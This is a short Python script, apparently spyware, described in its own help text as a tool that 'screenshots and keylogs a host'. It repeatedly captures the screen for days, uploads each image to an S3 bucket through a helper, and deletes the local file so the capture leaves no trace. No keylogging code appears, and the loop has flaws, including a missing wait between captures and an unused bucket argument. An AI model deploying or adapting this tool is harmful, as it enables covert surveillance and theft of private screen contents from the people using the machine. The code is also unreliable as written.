import sys
import argparse
import pyscreenshot as screenshot
import os
from datetime import timedelta, date, datetime
import utils


def main(args):
    duration = args.duration
    interval = args.interval
    output_dir = args.output_dir

    if not os.path.isdir(output_dir):
        print('Output directory is not a directory.')
        return

    cur_date = datetime.now()
    end_date = timedelta(days=duration) + cur_date
    delta = timedelta(seconds=interval)
    while cur_date <= end_date:
        im = screenshot.grab()
        file_name = 'screenshot'+cur_date.strftime("%m-%d-%M-%S")+'.png'
        fp = output_dir + '/' + file_name
        im.save(fp)
        utils.save_to_s3(fp, file_name)
        os.remove(fp)
        cur_date += delta


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                                    description = "Screenshots and keylogs a host",
                                )
    parser.add_argument("-d", "--duration", type=int, default=7,
                      help = "The duration of the script in days")
    parser.add_argument("-i", "--interval", type=int, default=10,
                      help = "The interval of the screenshots in seconds")
    parser.add_argument("-o", "--output_dir", default=os.environ['HOME'],
                      help = "The output directory of the screenshots")
    parser.add_argument("-s3", "--s3_bucket",
                      help = "The output directory of the screenshots")

    args = parser.parse_args()
    main(args)
